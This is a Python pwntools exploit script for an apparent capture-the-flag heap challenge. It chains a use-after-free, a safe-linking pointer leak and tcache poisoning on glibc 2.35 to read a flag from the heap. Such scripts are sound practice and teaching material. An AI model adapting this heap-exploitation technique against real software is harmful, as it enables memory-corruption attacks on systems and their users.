#!/usr/bin/env python3
# House-of-water (heap UAF -> tcache poisoning -> read flag on heap)
from pwn import *
import re, sys

context.arch = 'amd64'
context.log_level = 'info'

BIN = './chal_patched'          # patched to the matching 2.35 loader
LIBC = ELF('./libc.so.6', checksec=False)

def start():
    if args.REMOTE:
        host, port = args.HOST or 'localhost', int(args.PORT or 1337)
        return remote(host, port)
    return process(BIN)

io = start()

def add(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, off, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Offset: ', str(off).encode())
    io.sendlineafter(b'Length: ', str(len(data)).encode())
    io.sendafter(b'bytes): ', data)   # raw, no trailing newline (fread reads exactly len)

def show(idx, off, length):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Offset: ', str(off).encode())
    io.sendlineafter(b'Length: ', str(length).encode())
    buf = io.recvuntil(b'1) malloc')      # next menu reprint
    buf = buf.split(b'1) malloc')[0]
    hexb = re.findall(rb'[0-9a-f]{2}', buf)
    return b''.join(bytes.fromhex(h.decode()) for h in hexb)[:length]

SZ = 0x100
# 1) two chunks in the same tcache bin
add(0, SZ)                       # A
add(1, SZ)                       # B (adjacent, same 4K page as A)
free(0)                          # bin: A
free(1)                          # bin: B -> A   (counts = 2, head = B)

# 2) heap leak via safe-linking.
#    glibc >= 2.34 randomises the tcache 'key' field, so use the fd instead:
#    A was freed into an empty bin -> A->next = PROTECT(0) = A>>12
#    B's      next  = (B>>12) ^ A     (A,B share a page -> B>>12 == A>>12)
fdA = u64(show(0, 0, 8))         # A>>12
fdB = u64(show(1, 0, 8))         # (B>>12) ^ A
A_full = fdB ^ fdA               # full address of A
heap = (fdA << 12)               # heap base (page-aligned, A in first page)
log.info(f'A>>12  = {hex(fdA)}')
log.info(f'A_full = {hex(A_full)}   -> heap+{hex(A_full - heap)}')
log.info(f'heap   = {hex(heap)}')

# 3) tcache poisoning: make head chunk (B) point at fake chunk T
T = heap + 0x290                 # fake chunk whose user data lands on flag-0x10
edit(1, 0, p64(T ^ (heap >> 12)))

# 4) two pops -> second returns T
add(2, SZ)                       # pops B
add(3, SZ)                       # pops T  (heap+0x290)

# 5) flag lives at heap+0x2a0 == T+0x10
flag = show(3, 0x10, 0x80)
log.success(f'leak: {flag!r}')
m = re.search(rb'flag\{[^}]*\}', flag)
if m:
    print('FLAG =', m.group().decode())
else:
    print('raw =', flag)
io.close()
